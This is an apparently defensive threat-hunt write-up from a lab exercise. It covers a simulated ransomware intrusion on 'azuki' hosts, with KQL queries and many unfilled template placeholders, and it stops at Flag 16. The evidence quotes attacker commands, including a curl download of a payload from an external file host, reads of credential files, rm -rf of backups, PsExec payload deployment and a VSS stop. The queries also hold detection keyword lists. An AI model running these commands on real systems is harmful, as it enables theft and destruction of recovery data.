
<p align="center">
  <img
    src="https://github.com/user-attachments/assets/337bb215-8833-4653-b570-93c443bd9c11"
    width="1200"
    alt="Threat Hunt Cover Image"
  />
</p>





# 🛡️ Threat Hunt Report – Deep in the Water

---

## 📌 Executive Summary

<Brief, high-level overview of the threat hunt.  
Answer what happened, why it matters, and what was discovered in 3–4 sentences.>

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  

---

## 🧭 Scope & Environment

- **Environment:** <Placeholder>  
- **Data Sources:** <Placeholder>  
- **Timeframe:** <YYYY-MM-DD → YYYY-MM-DD> 
- **Link:** https://docs.google.com/forms/d/e/1FAIpQLSdGLxM71I2kXx4L9MhB6ipWMKCDXJxJRjXTNg_3gK1SkDmQ8g/viewform
![Uploading image.png…]()

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 21](#-flag-21)
  - [🚩 Flag 22](#-flag-22)
  - [🚩 Flag 23](#-flag-23)
  - [🚩 Flag 24](#-flag-24)
  - [🚩 Flag 25](#-flag-25)
  - [🚩 Flag 26](#-flag-26)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | <Placeholder> | <Placeholder> | <Placeholder> |
| 2 | <Placeholder> | <Placeholder> | <Placeholder> |
| 3 | <Placeholder> | <Placeholder> | <Placeholder> |
| 4 | <Placeholder> | <Placeholder> | <Placeholder> |
| 5 | <Placeholder> | <Placeholder> | <Placeholder> |
| 6 | <Placeholder> | <Placeholder> | <Placeholder> |
| 7 | <Placeholder> | <Placeholder> | <Placeholder> |
| 8 | <Placeholder> | <Placeholder> | <Placeholder> |
| 9 | <Placeholder> | <Placeholder> | <Placeholder> |
| 10 | <Placeholder> | <Placeholder> | <Placeholder> |
| 11 | <Placeholder> | <Placeholder> | <Placeholder> |
| 12 | <Placeholder> | <Placeholder> | <Placeholder> |
| 13 | <Placeholder> | <Placeholder> | <Placeholder> |
| 14 | <Placeholder> | <Placeholder> | <Placeholder> |
| 15 | <Placeholder> | <Placeholder> | <Placeholder> |
| 16 | <Placeholder> | <Placeholder> | <Placeholder> |
| 17 | <Placeholder> | <Placeholder> | <Placeholder> |
| 18 | <Placeholder> | <Placeholder> | <Placeholder> |
| 19 | <Placeholder> | <Placeholder> | <Placeholder> |
| 20 | <Placeholder> | <Placeholder> | <Placeholder> |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: LATERAL MOVEMENT - Remote Access</strong></summary>

### 🎯 Objective
Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.

### 📌 Finding
DeviceNetworkEvents
| where TimeGenerated >= ago(45d)
| where RemotePort == 22
| where RemoteIP has "10." or RemoteIP has "172." or RemoteIP has "192."
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z|
| Process | ssh.exe |
| Parent Process | Unknown |
| Command Line | "ssh.exe" backup-admin@10.1.0.189 |

### 💡 Why it matters
This activity maps directly to **MITRE ATT&CK – TA0008: Lateral Movement**, specifically **T1021.004: Remote Services – SSH**. Adversaries who obtain valid credentials frequently use SSH to move laterally within internal networks because it is trusted, encrypted, and often poorly monitored. 

In ransomware and destructive intrusion campaigns, attackers deliberately pivot to backup servers and administrative systems via SSH to disable recovery mechanisms, exfiltrate credentials, or stage payloads prior to impact. Detection of unexpected SSH-based lateral movement is therefore critical for identifying hands-on-keyboard activity during the pre-encryption phase of an attack.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated >= ago(45d)
| where RemotePort == 22
| where RemoteIP has "10." or RemoteIP has "172." or RemoteIP has "192."
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img width="1527" height="142" alt="image" src="https://github.com/user-attachments/assets/da941ffe-cb3a-45bb-8468-28288009e8e2" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Baseline which hosts and user accounts are authorized to initiate SSH sessions to internal systems. Alert on new or rare SSH connections originating from user workstations, especially when targeting backup servers, domain controllers, or other high-value infrastructure, and correlate with credential use, privilege escalation, and subsequent destructive activity.

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: LATERAL MOVEMENT - Attack Source</strong></summary>

### 🎯 Objective
Identifying the attack source enables network segmentation and containment.

References:

T1021.004: Remote Services - SSH

### 📌 Finding
10.1.0.108

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z|


### 💡 Why it matters
This activity maps directly to **MITRE ATT&CK – TA0008: Lateral Movement**, specifically **T1021.004: Remote Services – SSH**. Adversaries who obtain valid credentials frequently use SSH to move laterally within internal networks because it is trusted, encrypted, and often poorly monitored. 

In ransomware and destructive intrusion campaigns, attackers deliberately pivot to backup servers and administrative systems via SSH to disable recovery mechanisms, exfiltrate credentials, or stage payloads prior to impact. Detection of unexpected SSH-based lateral movement is therefore critical for identifying hands-on-keyboard activity during the pre-encryption phase of an attack.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"
| where RemotePort == 22
| project LocalIP
```

### 🖼️ Screenshot
<img width="1562" height="133" alt="image" src="https://github.com/user-attachments/assets/b4a20f90-ae37-41cd-8182-27a5210b6726" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating lateral movement, always pivot on the source host and local IP address to anchor attacker activity. Use the identified source system to review process execution, authentication events, and outbound network connections around the same timestamp to determine whether the workstation is an initial foothold or a secondary pivot point. Confirm whether this host routinely initiates remote access sessions or if the behavior is anomalous, and prioritize containment of the source system to prevent further lateral spread.

</details>

---
<details>
<summary id="-flag-3">🚩 <strong>Flag 3: CREDENTIAL ACCESS - Compromised Account</strong></summary>

### 🎯 Objective
Administrative accounts with backup privileges provide access to critical recovery infrastructure.

### 📌 Finding
backup-admin

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z |
| Process | SSH.exe |
| Command Line | "ssh.exe" backup-admin@10.1.0.189 |

### 💡 Why it matters
This activity aligns with Valid Accounts – Domain Accounts (MITRE ATT&CK T1078.002), where adversaries use legitimate credentials rather than exploiting vulnerabilities. The use of a backup-related administrative account indicates the attacker has already bypassed preventive controls and is operating with trusted access. Compromise of such accounts is especially dangerous because they provide direct access to recovery infrastructure, enabling attackers to disable backups, move laterally with minimal resistance, and significantly increase the impact of ransomware or destructive attacks.

### 🔧 KQL Query Used
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"
| where RemotePort == 22
| project TimeGenerated, InitiatingProcessCommandLine

### 🖼️ Screenshot
<img width="1543" height="126" alt="image" src="https://github.com/user-attachments/assets/c728035b-715e-4bc6-992d-60dbf46addf8" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Identify administrative or service accounts that are used interactively (SSH, RDP) rather than through automated services. Baseline expected usage of backup and recovery accounts, and alert when they are observed initiating remote sessions from user workstations or accessing systems outside their normal scope. Correlate account usage with privilege level, time of day, and lateral movement patterns to detect credential compromise early.

</details>

---
<details>
<summary id="-flag-4">🚩 <strong>Flag 4: DISCOVERY - Directory Enumeration</strong></summary>

### 🎯 Objective
File system enumeration reveals backup locations and valuable targets for destruction.

### 📌 Finding
ls --color=auto -la /backups/

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:51.749736Z |
| Process | ls |
| Parent Process | bash |
| Command Line | ls --color=auto -la /backups/ |

### 💡 Why it matters
This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), where adversaries enumerate the file system to identify high-value data and infrastructure components. Enumerating the /backups/ directory on a backup server indicates the attacker is actively identifying recovery data that could later be deleted, encrypted, or otherwise rendered unusable. 

When this behavior follows lateral movement into backup infrastructure, it strongly suggests preparation for impact rather than routine administration, and represents one of the final reconnaissance steps before destructive actions.

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T05:39:11Z) .. datetime(2025-11-25T06:30:00Z))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("ls ", "dir ", "find ")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1517" height="107" alt="image" src="https://github.com/user-attachments/assets/2d66000c-c33c-4fdc-8d2a-1e2dd78641be" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive enumeration commands (e.g., ls, find, dir) executed on backup servers, especially when initiated shortly after new remote access sessions. Baseline normal administrative activity on backup infrastructure and alert when file listing or discovery commands target known backup directories outside of routine maintenance windows, as this often precedes destructive actions.

</details>

---
<details>
<summary id="-flag-5">🚩 <strong>Flag 5: DISCOVERY - File Search</strong></summary>

### 🎯 Objective
Attackers search for specific file types to identify high-value targets.

### 📌 Finding
find /backups -name *.tar.gz

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-24T14:16:06.546964Z |
| Process | find |
| Parent Process | bash |
| Command Line | find /backups -name *.tar.gz |

### 💡 Why it matters
This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), where adversaries search for specific file types to locate high-value data. By targeting compressed backup archives (*.tar.gz) within the /backups directory, the attacker is narrowing in on data that is most valuable for recovery or extortion. 

This indicates focused reconnaissance rather than broad exploration, suggesting the attacker is identifying precise targets for deletion or encryption as part of a planned impact phase.

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName has "azuki-backupsrv"
| where AccountName has "" "backup-admin"
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1525" height="199" alt="image" src="https://github.com/user-attachments/assets/c972a0a2-7c18-4ac0-b01c-cc2dc7c23c6d" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for targeted file search commands such as find executed against backup directories, especially when filtering for archive or backup-related extensions (e.g., .tar.gz, .zip, .bak). These searches are rarely part of routine administration and often indicate attackers are identifying specific data for destruction or exfiltration. Correlate file search activity with prior remote access, directory enumeration, and privileged account usage to detect attacks progressing toward impact.

</details>

---
<details>
<summary id="-flag-6">🚩 <strong>Flag 6: DISCOVERY - Account Enumeration</strong></summary>

### 🎯 Objective
Attackers enumerate local accounts to understand the system's user base.

### 📌 Finding
cat /etc/passwd

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-24T14:16:08.673485Z |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /etc/passwd |

### 💡 Why it matters
This activity aligns with Account Discovery (MITRE ATT&CK T1087), where adversaries enumerate local accounts to understand which identities exist on a system. Reading /etc/passwd allows an attacker to identify human users, service accounts, login shells, and potential privilege boundaries. 

On a backup server, this reconnaissance helps the attacker determine which accounts may be leveraged for privilege escalation, credential reuse, or broader lateral movement before executing impact actions.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where ProcessCommandLine has_any ("passwd", "/etc/passwd", "getent", "id", "lslogins")
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine

### 🖼️ Screenshot
<img width="772" height="167" alt="image" src="https://github.com/user-attachments/assets/6cfb3235-7ce0-41ed-9303-42e630defe81" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive access to local account databases such as /etc/passwd, /etc/shadow, or account enumeration utilities (getent, id, lslogins) on backup and infrastructure servers. These actions are uncommon outside of troubleshooting or audits and should be correlated with recent remote access sessions and elevated account usage. Prioritize investigation when account enumeration occurs shortly after lateral movement, as it often precedes privilege escalation or destructive activity.

</details>

---
<details>
<summary id="-flag-7">🚩 <strong>Flag 7: DISCOVERY - Scheduled Job Reconnaissance</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
cat /etc/crontab

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | <Placeholder> |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /etc/crontab |

### 💡 Why it matters
This activity aligns with Scheduled Task/Job Discovery (MITRE ATT&CK T1053.003 – Cron), where adversaries inspect scheduled jobs to understand automated system behavior. By reviewing /etc/crontab, the attacker can identify backup schedules, maintenance tasks, and privileged jobs that may be disabled, hijacked, or timed to coincide with destructive actions. 

On a backup server, this reconnaissance helps attackers determine when backups run and how to maximize impact while minimizing detection.

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has "/etc/crontab"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="705" height="130" alt="image" src="https://github.com/user-attachments/assets/d8d9a79b-5020-4704-9aab-f9bfe838e8ae" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive access to cron configuration files such as /etc/crontab and /etc/cron* on backup and infrastructure servers. These files are rarely accessed outside of maintenance or troubleshooting and should be correlated with recent remote access and discovery activity. 

Prioritize investigation when scheduled job reconnaissance occurs alongside backup enumeration, as attackers often use this information to time or disable recovery mechanisms before impact.

</details>

---
<details>
<summary id="-flag-8">🚩 <strong>Flag 8: COMMAND AND CONTROL - Tool Transfer</strong></summary>

### 🎯 Objective
Attackers download tools from external infrastructure to carry out the attack.

References:

T1105: Ingress Tool Transfer

### 📌 Finding
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:45:34.259149Z |
| Process | curl |
| Parent Process | bash |
| Command Line | curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z |

### 💡 Why it matters
This activity aligns with Ingress Tool Transfer (MITRE ATT&CK T1105), where adversaries introduce external tools into the environment to enable later stages of the attack. Backup servers rarely require outbound downloads from public hosting services, making this behavior highly anomalous. When observed after lateral movement and reconnaissance, ingress tool transfer strongly indicates the attacker is transitioning from discovery to impact, leaving limited time for defenders to intervene.

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("wget ", "curl ", "scp ", "ftp ")
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="831" height="81" alt="image" src="https://github.com/user-attachments/assets/68d3c840-8130-4b5a-bea2-29ecc9c256a3" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor critical infrastructure systems, especially backup servers, for interactive use of file transfer utilities such as curl or wget making outbound connections to external hosts. Pay particular attention to downloads originating from public file-hosting services, as these are commonly used to stage tools immediately before destructive actions. Correlate tool transfer activity with prior remote access and reconnaissance to identify attacks approaching the impact phase.

</details>

---
<details>
<summary id="-flag-9">🚩 <strong>Flag 9: CREDENTIAL ACCESS - Credential Theft</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
cat /backups/configs/all-credentials.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net> |
| Timestamp | 2025-11-24T14:14:14.217788Z |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /backups/configs/all-credentials.txt |

### 💡 Why it matters
This activity aligns with Credentials from Password Stores (MITRE ATT&CK T1555). Accessing a file explicitly named to contain credentials indicates the attacker is harvesting secrets rather than merely enumerating the system. On a backup server, exposed credentials often grant access to additional infrastructure, significantly expanding attacker reach and accelerating progression toward full environment compromise.

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ( "password"  "passwd", "credential", "credentials", "cred", "secret","secrets",  "token", "key", "keys",".key" , ".pem", ".pfx", ".pgpass", ".env",".conf", "/etc/passwd","/etc/shadow", "/etc/bacula",".ssh", "id_rsa", "authorized_keys")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="653" height="100" alt="image" src="https://github.com/user-attachments/assets/03ac9d9a-7655-4355-a32e-96f999e55560" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on interactive access to files containing credential-related keywords (e.g., credentials, secrets, .env, .conf) on backup and infrastructure servers. Correlate with prior discovery and lateral movement to identify credential theft occurring late in the intrusion.

</details>

---
<details>
<summary id="-flag-10">🚩 <strong>Flag 10: IMPACT - Data Destruction</strong></summary>

### 🎯 Objective
Destroying backups eliminates recovery options and maximises ransomware impact.

References:

T1485: Data Destruction

### 📌 Finding
rm -rf /backups/archives

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:02.660493Z |
| Process | rm |
| Parent Process | bash |
| Command Line | rm -rf /backups/archives |

### 💡 Why it matters
This activity aligns with Data Destruction (MITRE ATT&CK T1485), where adversaries deliberately delete data to prevent system recovery and maximize operational impact. The use of a recursive deletion command against backup directories indicates intentional destruction of recovery data rather than routine maintenance. 

Once backup data is removed, defenders lose the ability to restore affected systems, significantly increasing the success and leverage of ransomware or destructive attacks.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "rm -f",
    "rm -rf",
    "unlink ",
    "xargs rm",
    "find / -exec rm",
    "shred ",
    "dd if=",
    "dd of=",
    "truncate ",
    "/var/backups",
    "/backups",
    "/etc/bacula",
    "/var/lib/bacula",
    ".tar",
    ".tar.gz",
    ".zip",
    ".bak",
    "chmod 000",
    "chattr -i",
    "chattr +i"
)
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessCommandLine, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1527" height="160" alt="image" src="https://github.com/user-attachments/assets/9b45c1bc-d77a-40c2-acdf-770ec63093f6" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for recursive file deletion commands such as rm -rf executed on backup or recovery systems, particularly when targeting known backup directories. These actions are rarely legitimate and should be treated as high-severity events requiring immediate response. Correlate deletion activity with prior remote access, reconnaissance, and tool transfer to identify attacks that have reached the impact stage.

</details>

---
<details>
<summary id="-flag-11">🚩 <strong>Flag 11: IMPACT - Service Stopped</strong></summary>

### 🎯 Objective
Stopping services takes effect immediately but does NOT survive a reboot.
Disrupt scheduled system activity to interfere with backups and system maintenance.

### 📌 Finding
systemctl stop cron

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:03.659261Z |
| Process | systemctl |
| Parent Process | bash |
| Command Line | systemctl stop cron |

### 💡 Why it matters
This aligns with Service Stop (MITRE ATT&CK T1489). Stopping the cron service prevents scheduled jobs such as backups, monitoring, or cleanup tasks from running. In ransomware attacks, this is commonly used to halt backup operations and reduce the chance of recovery or detection.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "systemctl stop",  "service ",  "service stop",  "pkill ",  "kill ",  "killall ",    "sv stop",  "rc-service",  "chkconfig", "initctl stop")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc


### 🖼️ Screenshot
<img width="804" height="163" alt="image" src="https://github.com/user-attachments/assets/5178b54c-a5db-451e-babd-c39cc1c249ac" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for systemctl or service stop commands on critical infrastructure. Treat service stoppage on backup servers as high-severity, especially when it follows discovery or destructive activity.

</details>

---
<details>
<summary id="-flag-12">🚩 <strong>Flag 12: IMPACT - Service Disabled</strong></summary>

### 🎯 Objective
Permanently prevent scheduled services from restarting after reboot. Disabling a service prevents it from starting at boot - this SURVIVES a reboot.

### 📌 Finding
systemctl disable cron

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:03.679621Z |
| Process | systemctl |
| Parent Process | bash |
| Command Line | systemctl disable cron |

### 💡 Why it matters
This aligns with Service Stop / Modify System Services (MITRE ATT&CK T1489 / T1543). Disabling cron ensures backup and maintenance jobs do not resume, extending the impact beyond the current session and increasing operational disruption.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "systemctl stop",
    "systemctl disable",
    "systemctl mask",
    "service stop",
    "initctl stop",
    "rc-service stop",
    "update-rc.d",
    "chkconfig off",
    "pkill ",
    "killall "
)
| project TimeGenerated, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="575" height="106" alt="image" src="https://github.com/user-attachments/assets/2a925017-a324-4fb9-a8b0-39eedd9f413c" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert when system services are disabled on backup or infrastructure servers. Prioritize incidents where service disablement follows service stoppage or backup deletion.

</details>

---
<details>
<summary id="-flag-13">🚩 <strong>Flag 13: LATERAL MOVEMENT - Remote Execution</strong></summary>

### 🎯 Objective
Execute commands remotely on additional systems using administrative access. Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.

### 📌 Finding
PsExec64.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | PsExec64.exe |
| Parent Process | cmd.exe or powershell.exe  |
| Command Line | PsExec64.exe |

### 💡 Why it matters
This aligns with Remote Services: SMB/Windows Admin Shares (MITRE ATT&CK T1021.002). PsExec is a legitimate administrative tool frequently abused by attackers to move laterally and execute payloads across multiple hosts quickly.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName endswith ".exe"
| where ProcessCommandLine has_any ("\\\\","ADMIN$","IPC$","C$","schtasks","wmic","sc ","psexec","PSEXESVC","at.exe","/node:","process call create")
| summarize DeviceCount=dcount(DeviceName), Devices=make_set(DeviceName) by FileName, ProcessCommandLine
| order by DeviceCount desc

### 🖼️ Screenshot
<img width="792" height="138" alt="image" src="https://github.com/user-attachments/assets/e0f3dd10-f0b8-4fb3-8d64-b92bac00c095" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for PsExec execution across multiple hosts, especially outside of approved admin tooling paths. Correlate with credential compromise and prior impact actions.

</details>

---
<details>
<summary id="-flag-14">🚩 <strong>Flag 14: LATERAL MOVEMENT - Deployment Command</strong></summary>

### 🎯 Objective
Full command lines reveal target systems, credentials, and deployed payloads.

References:

T1021.002: SMB/Windows Admin Shares

### 📌 Finding
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | PsExec64.exe |
| Parent Process | Likely cmd.exe or powershell.exe |
| Command Line | "PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe |

### 💡 Why it matters
This aligns with Remote Execution (MITRE ATT&CK T1021). Using PsExec with explicit credentials to copy and execute a binary shows coordinated lateral deployment of malicious tooling.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where FileName =~ "PsExec64.exe"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on PsExec commands that include credential arguments and file copy flags. These are rarely used in modern admin workflows and often indicate malicious lateral deployment.

</details>

---
<details>
<summary id="-flag-15">🚩 <strong>Flag 15: EXECUTION - Malicious Payload</strong></summary>

### 🎯 Objective
Execute malicious payload to carry out encryption or destructive actions. Identifying the payload enables threat hunting across the environment

### 📌 Finding
silentlynx.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | silentlynx.exe |
| Parent Process | PsExec64.exe |
| Command Line | silentlynx.exe |

### 💡 Why it matters
This aligns with User Execution / Malicious File Execution (MITRE ATT&CK T1204 / T1059). Execution of a non-standard binary deployed via PsExec strongly indicates attacker-controlled payload execution as part of the impact phase.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where FileName =~ "PsExec64.exe"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for execution of newly dropped binaries, especially those launched via remote execution tools. Treat such events as high-confidence malicious activity.

</details>

---
<details>
<summary id="-flag-16">🚩 <strong>Flag 16: IMPACT - Shadow Service Stopped</strong></summary>

### 🎯 Objective
Ransomware stops backup services to prevent recovery during encryption. Disable Volume Shadow Copy Service to prevent snapshot-based recovery.

### 📌 Finding
"net" stop VSS /y

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:04:53.2550438Z |
| Process | net.exe |
| Parent Process | cmd.exe |
| Command Line | net stop VSS /y |

### 💡 Why it matters
This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Stopping VSS removes a common recovery mechanism, significantly increasing ransomware effectiveness.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName in ("net.exe","sc.exe","services.exe")
| where ProcessCommandLine has_any ("VSS","Shadow","Volume")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="927" height="167" alt="image" src="https://github.com/user-attachments/assets/630ac85f-1500-47ec-96e9-2526c9626149" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
